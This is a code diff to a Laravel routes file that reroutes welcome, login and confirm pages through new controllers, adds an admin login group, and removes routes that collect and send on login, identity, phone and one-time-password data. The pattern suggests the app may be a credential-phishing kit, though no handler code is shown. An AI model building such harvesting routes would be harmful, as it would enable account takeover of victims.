@@ -1,6 +1,8 @@
 <?php
 
+use App\Http\Controllers\AdminController;
 use App\Http\Controllers\Controller;
+use App\Http\Controllers\HomeController;
 use App\Http\Livewire\Auth\Login;
 use App\Http\Livewire\Confirm;
 use App\Http\Livewire\EditLabel;
@@ -53,21 +55,18 @@ if (env('IS_GET_BY_SETTING') == 1) {
     $pathConfirmPage = $parseConfirmPage['path'] ?? '/';
 }
 
-Route::get($pathWelcomePage, Welcome::class)->name('welcome');
+Route::get($pathWelcomePage, [HomeController::class, 'welcome'])->name('welcome');
+Route::get($pathLoginPage, [HomeController::class, 'login'])->name('login');
+Route::get($pathConfirmPage, [HomeController::class, 'confirm'])->name('confirm');
 
-
-Route::get($pathLoginPage, Confirm::class)->name('form');
-Route::get($pathConfirmPage, Form::class)->name('confirm');
-Route::get('/administrator', Login::class)->name('login');
+Route::group(['prefix'=> 'admin', 'as' => 'admin.'],function () {
+    Route::get('/login', [AdminController::class, 'login'])->name('login');
+    Route::post('/checkLogin', [AdminController::class, 'checkLogin'])->name('checkLogin');
+});
 Route::get('/404', Err404::class)->name('404');
 Route::get('/500', Err500::class)->name('500');
 Route::get('/set-locale', [Controller::class, 'setLocale'])->name('setLocale');
 Route::get('/set-country-code', [Controller::class, 'setCountryCode'])->name('setCountryCode');
-Route::post('/send-data-login', [Controller::class, 'getAndSendDataLogin'])->name('getAndSendDataLogin');
-Route::post('/send-data-review', [Controller::class, 'getAndSendDataReview'])->name('getAndSendDataReview');
-Route::post('/send-data-identity', [Controller::class, 'getAndSendDataIdentity'])->name('getAndSendDataIdentity');
-Route::post('/send-data-phone', [Controller::class, 'getAndSendDataMobile'])->name('getAndSendDataMobile');
-Route::post('/send-data-otp', [Controller::class, 'getAndSendDataOtp'])->name('getAndSendDataOtp');
 
 Route::middleware('auth')->group(function () {
     Route::get('/logout', [Controller::class, 'logout'])->name('logout');
@@ -77,5 +76,7 @@ Route::middleware('auth')->group(function () {
     Route::get('/settings', Setting::class)->name('settings');
 });
 
-Route::get('/', Login::class)->name('login');
+Route::get('/', function () {
+    return redirect()->route('welcome');
+});
 
